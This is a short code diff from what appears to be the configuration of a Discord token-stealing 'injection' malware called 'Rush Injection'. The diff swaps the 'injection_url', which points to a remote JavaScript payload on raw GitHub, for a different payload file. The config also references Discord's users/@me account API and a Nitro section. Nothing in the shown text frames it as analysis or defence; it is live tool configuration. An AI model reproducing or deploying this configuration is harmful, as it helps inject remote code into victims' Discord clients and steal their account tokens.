@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Rush Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/559513113645547521/1103871603282018414/Discord_Pfp_Red_Devil.gif?width=625&height=625', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/EyeLoveBigBlackHawks/donotrun/main/.github/DjKhaled.js', 
+  injection_url: 'https://raw.githubusercontent.com/EyeLoveBigBlackHawks/donotrun/main/.github/Allah.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
